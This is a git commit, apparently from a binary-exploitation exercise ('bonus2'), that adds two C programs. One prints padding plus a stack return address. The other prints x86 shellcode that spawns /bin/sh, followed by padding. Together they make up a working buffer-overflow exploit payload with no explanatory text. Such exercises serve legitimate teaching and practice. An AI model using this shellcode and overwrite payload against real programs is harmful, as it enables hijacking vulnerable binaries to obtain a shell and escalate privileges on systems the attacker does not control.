32be657062d025eeaad45cd146d991aae4d5454f
Sawyerf <sawyer.flink@protonmail.ch>
2021-09-23 18:49:28 +0200

    Add: pattern.c && shellcode.c bonus2

---
+++ bonus2/Ressources/pattern.c
@@ -0,0 +1,8 @@
+#include <stdio.h>
+#include <unistd.h>
+
+int main()
+{
+        printf("BBBBBBBBBBBBBBBBBBBBBBB" \
+                "\xa0\xfd\xff\xbf");
+}
---
+++ bonus2/Ressources/shellcode.c
@@ -0,0 +1,8 @@
+#include <stdio.h>
+#include <unistd.h>
+
+int main()
+{
+        printf("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd" \
+                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+}
